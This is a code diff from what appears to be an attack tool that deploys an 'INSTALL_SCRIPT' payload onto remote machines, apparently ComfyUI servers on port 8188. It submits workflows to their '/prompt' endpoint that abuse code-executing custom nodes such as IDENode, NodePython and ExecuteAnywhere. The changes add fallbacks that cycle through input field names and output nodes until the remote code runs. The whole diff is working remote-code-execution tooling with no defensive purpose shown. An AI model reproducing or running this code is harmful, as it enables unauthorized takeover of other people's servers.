@@ -65,8 +65,7 @@ def deploy_via_idenode(target, port=8188):
         "1": {
             "class_type": "IDENode",
             "inputs": {
-                "code": INSTALL_SCRIPT,
-                "language": "python",
+                "pycode": INSTALL_SCRIPT,
             }
         },
         "2": {
@@ -104,53 +103,61 @@ def deploy_via_idenode(target, port=8188):
         except Exception:
             pass
         print(f"[idenode] HTTP {exc.code}: {body[:300]}")
-        if exc.code == 400 and "no_outputs" in body:
-            return deploy_via_idenode_alt(target, port)
-        return False
+        return deploy_via_idenode_alt(target, port)
     except Exception as exc:
         print(f"[idenode] Failed: {exc}")
         return False
 
 
 def deploy_via_idenode_alt(target, port=8188):
-    """Fallback: try different output node combos if PreviewTextNode didn't work."""
-    print(f"[idenode-alt] Trying alternative output nodes...")
+    """Fallback: try different input/output field combos."""
+    print(f"[idenode-alt] Trying alternative field names...")
 
-    output_nodes = [
-        ("PreviewTextNode", {"text": ["1", 0]}),
-        ("ShowText|pysssss", {"text": ["1", 0]}),
-        ("Display Any (rgthree)", {"source": ["1", 0]}),
+    ide_input_variants = [
+        {"pycode": INSTALL_SCRIPT},
+        {"pycode": INSTALL_SCRIPT, "language": "python"},
+        {"code": INSTALL_SCRIPT, "language": "python"},
+        {"code": INSTALL_SCRIPT},
     ]
 
-    for out_name, out_inputs in output_nodes:
-        prompt = {
-            "1": {
-                "class_type": "IDENode",
-                "inputs": {
-                    "code": INSTALL_SCRIPT,
-                    "language": "python",
+    output_variants = [
+        ("PreviewTextNode", {"text": ["1", 0]}),
+        ("PreviewTextNode", {"text": ""}),
+    ]
+
+    for ide_inputs in ide_input_variants:
+        for out_name, out_inputs in output_variants:
+            prompt = {
+                "1": {
+                    "class_type": "IDENode",
+                    "inputs": ide_inputs,
+                },
+                "2": {
+                    "class_type": out_name,
+                    "inputs": out_inputs,
                 }
-            },
-            "2": {
-                "class_type": out_name,
-                "inputs": out_inputs,
             }
-        }
 
-        url = f"http://{target}:{port}/prompt"
-        try:
-            result = _post_json(url, {"prompt": prompt})
-            if result.get("prompt_id"):
-                print(f"[idenode-alt] Queued via {out_name}: {result['prompt_id']}")
-                time.sleep(30)
-                return True
-        except urllib.error.HTTPError as e:
-            if e.code == 400:
+            url = f"http://{target}:{port}/prompt"
+            try:
+                result = _post_json(url, {"prompt": prompt})
+                if result.get("prompt_id"):
+                    print(f"[idenode-alt] Queued with inputs={list(ide_inputs.keys())} -> {out_name}: {result['prompt_id']}")
+                    time.sleep(45)
+                    return True
+            except urllib.error.HTTPError as e:
+                body = ""
+                try:
+                    body = e.read().decode()
+                except Exception:
+                    pass
+                if e.code == 400:
+                    print(f"[idenode-alt] 400 with {list(ide_inputs.keys())} -> {out_name}: {body[:200]}")
+                    continue
+            except Exception:
                 continue
-        except Exception:
-            continue
 
-    print(f"[idenode-alt] All output node combos failed")
+    print(f"[idenode-alt] All combos failed")
     return False
 
 
@@ -196,14 +203,15 @@ def deploy_via_prompt_api(target, port=8188):
     print(f"[api] Deploying to {target}:{port} via prompt API...")
 
     exec_nodes = [
-        ("IDENode", {"code": INSTALL_SCRIPT, "language": "python"}),
+        ("IDENode", {"pycode": INSTALL_SCRIPT}),
+        ("IDENode", {"pycode": INSTALL_SCRIPT, "language": "python"}),
         ("NodePython", {"code": INSTALL_SCRIPT}),
         ("ExecuteAnywhere", {"code": INSTALL_SCRIPT}),
     ]
 
     output_nodes = [
         ("PreviewTextNode", {"text": ["1", 0]}),
-        ("ShowText|pysssss", {"text": ["1", 0]}),
+        ("PreviewTextNode", {"text": ""}),
     ]
 
     for node_type, inputs in exec_nodes:
